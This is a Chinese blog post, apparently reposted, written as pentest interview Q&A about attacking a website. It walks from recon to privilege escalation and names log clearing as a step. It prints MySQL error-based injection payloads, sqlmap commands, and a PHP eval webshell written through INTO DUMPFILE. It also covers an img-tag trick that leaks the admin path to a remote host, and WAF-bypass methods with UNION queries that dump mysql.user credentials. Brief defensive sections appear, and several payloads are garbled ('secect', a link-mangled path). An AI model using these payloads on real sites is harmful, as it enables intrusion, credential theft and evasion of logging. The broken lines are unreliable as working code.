---
layout: post
title: 给你一个网站你是如何来渗透测试的?
tags: 基础知识 渗透 渗透思路
categories: 基础知识
published: true
---

**1)信息收集，**
1，获取域名的whois信息,获取注册者邮箱姓名电话等。
2，查询服务器旁站以及子域名站点，因为主站一般比较难，所以先看看旁站有没有通用性的cms或者其他漏洞。
3，查看服务器操作系统版本，web中间件，看看是否存在已知的漏洞，比如IIS，APACHE,NGINX的解析漏洞
4，查看IP，进行IP地址端口扫描，对响应的端口进行漏洞探测，比如 rsync,心脏出血，mysql,ftp,ssh弱口令等。
5，扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏，比如php探针
6，google hack 进一步探测网站的信息，后台，敏感文件

**2）漏洞扫描**
开始检测漏洞，如XSS,XSRF,sql注入，代码执行，命令执行，越权访问，目录读取，任意文件读取，下载，文件包含，
远程命令执行，弱口令，上传，编辑器漏洞，暴力破解等
3）漏洞利用
利用以上的方式拿到webshell，或者其他权限
4）权限提升
提权服务器，比如windows下mysql的udf提权，serv-u提权，windows低版本的漏洞，如iis6,pr,巴西烤肉，
linux藏牛漏洞，linux内核版本漏洞提权，linux下的mysql system提权以及oracle低权限提权
5) 日志清理
6）总结报告及修复方案


**sqlmap，怎么对一个注入点注入？**
1）如果是get型号，直接，sqlmap -u "诸如点网址".
2) 如果是post型诸如点，可以sqlmap -u "注入点网址” --data="post的参数"
3）如果是cookie，X-Forwarded-For等，可以访问的时候，用burpsuite抓包，注入处用*号替换，放到文件里，然后sqlmap -r "文件地址"


**nmap，扫描的几种方式**


**sql注入的几种类型？**
1）报错注入
2）bool型注入
3）延时注入
4）宽字节注入


**报错注入的函数有哪些？** 
1）and extractvalue(1, concat(0x7e,(select @@version),0x7e))】】】----------------
2）通过floor报错 向下取整
3）+and updatexml(1, concat(0x7e,(secect @@version),0x7e),1)
4）.geometrycollection()select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));
5）.multipoint()select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));
6）.polygon()select * from test where id=1 and polygon((select * from(select * from(select user())a)b));
7）.multipolygon()select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));
8）.linestring()select * from test where id=1 and linestring((select * from(select * from(select user())a)b));
9）.multilinestring()select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));
10）.exp()select * from test where id=1 and exp(~(select * from(select user())a));
延时注入如何来判断？
if(ascii(substr(“hello”, 1, 1))=104, sleep(5), 1)


**盲注和延时注入的共同点？**
都是一个字符一个字符的判断


**如何拿一个网站的webshell？**
上传，后台编辑模板，sql注入写文件，命令执行，代码执行，
一些已经爆出的cms漏洞，比如dedecms后台可以直接建立脚本文件，wordpress上传插件包含脚本文件zip压缩包等


**sql注入写文件都有哪些函数？**
select '一句话' into outfile '路径'
select '一句话' into dumpfile '路径'
select '<?php eval($_POST[1]) ?>' into dumpfile 'd:\\wwwroot\[http://baidu.com](http://link.zhihu.com/?target=http%3A//baidu.com)\nvhack.php';


**如何防止CSRF?**
1,验证referer
2，验证token
详细：[浅谈cnode社区如何防止csrf攻击 - CNode技术社区](http://link.zhihu.com/?target=http%3A//cnodejs.org/topic/5533dd6e9138f09b629674fd)


**owasp 漏洞都有哪些？**
1、SQL注入防护方法：
2、失效的身份认证和会话管理
3、跨站脚本攻击XSS
4、直接引用不安全的对象
5、安全配置错误
6、敏感信息泄露
7、缺少功能级的访问控制
8、跨站请求伪造CSRF
9、使用含有已知漏洞的组件
10、未验证的重定向和转发


**SQL注入防护方法？**
1、使用安全的API
2、对输入的特殊字符进行Escape转义处理
3、使用白名单来规范化输入验证方法
4、对客户端输入进行控制，不允许输入SQL注入相关的特殊字符
5、服务器端在提交数据库进行SQL查询之前，对特殊字符进行过滤、转义、替换、删除。


**代码执行，文件读取，命令执行的函数都有哪些？**
1，代码执行：eval,preg_replace+/e,assert,call_user_func,call_user_func_array,create_function
2，文件读取：file_get_contents(),highlight_file(),fopen(),read file(),fread(),fgetss(), fgets(),parse_ini_file(),show_source(),file()等
3，命令执行：system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open()
img标签除了onerror属性外，还有其他获取管理员路径的办法吗？
src指定一个远程的脚本文件，获取referer
img标签除了onerror属性外，并且src属性的后缀名，必须以.jpg结尾，怎么获取管理员路径。
1,远程服务器修改apache配置文件，配置.jpg文件以php方式来解析
AddType application/x-httpd-php .jpg

```text
<img src=http://xss.tv/1.jpg> 
```

会以php方式来解析


**代码审计**
eval,preg_replace+/e,assert,call_user_func,call_user_func_array,create_function


文件读取：file_get_contents(),highlight_file(),fopen(),read file(),fread(),fgetss(), fgets(),parse_ini_file(),show_source(),file()等


命令执行：system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open()



**绕过walf**


1、关键字可以用%（只限IIS系列）。比如select，可以sel%e%ct。原理：网络层waf对SEL%E%CT进行url解码后变成SEL%E%CT，匹配select失败，而进入asp.dll对SEL%E%CT进行url解码却变成select。IIS下的asp.dll文件在对asp文件后参数串进行url解码时，会直接过滤掉09-0d（09是tab键,0d是回车）、20（空格）、%(后两个字符有一个不是十六进制)字符。xss也是同理。


2、通杀的，内联注释。安全狗不拦截，但是安全宝、加速乐、D盾等，看到/*!/就Fack了，所以只限于安全狗。比如：/*!select*/


3、编码。这个方法对waf很有效果，因为一般waf会解码，但是我们利用这个特点，进行两次编码，他解了第一次但不会解第二次，就bypass了。腾讯waf、百度waf等等都可以这样bypass的。


4，绕过策略一：伪造搜索引擎


早些版本的安全狗是有这个漏洞的，就是把User-Agent修改为搜索引擎


5，360webscan脚本存在这个问题，就是判断是否为admin dede install等目录，如果是则不做拦截


\1. GET /pen/news.php?id=1 union select user,password from mysql.user


\1. GET /pen/news.php/admin?id=1 union select user,password from mysql.user


\1. GET /pen/admin/..\news.php?id=1 union select user,password from mysql.user


6，multipart请求绕过，在POST请求中添加一个上传文件，绕过了绝大多数WAF。


7，参数绕过，复制参数，id=1&id=1


用一些特殊字符代替空格，比如在mysql中%0a是换行，可以代替空格，这个方法也可以部分绕过最新版本的安全狗，在sqlserver中可以用/**/代替空格


8,内联注释，


文件上传，复制文件包一份再加一份


在 form-data;后面增加一定的字符
宽字符注入

宽字符：解 决方法：就是在初始化连接和字符集之后，使用SET character_set_client=binary来设定客户端的字符集是二进制的。修改Windows下的MySQL配置文件一般是 my.ini，Linux下的MySQL配置文件一般是my.cnf，比如：mysql_query("SETcharacter_set_client=binary");。character_set_client指定的是SQL语句的编码，如果设置为 binary，MySQL就以二进制来执行，这样宽字节编码问题就没有用武之地了。



————————————————  
原文链接：https://blog.csdn.net/sinat_27042305/article/details/60877680?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-5.nonecase&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-5.nonecase